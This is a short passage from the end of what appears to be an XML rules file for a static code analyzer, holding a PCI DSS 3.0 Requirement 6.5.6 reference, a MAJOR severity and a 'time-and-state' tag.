																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>time-and-state</tag>
  </rule>
</rules>
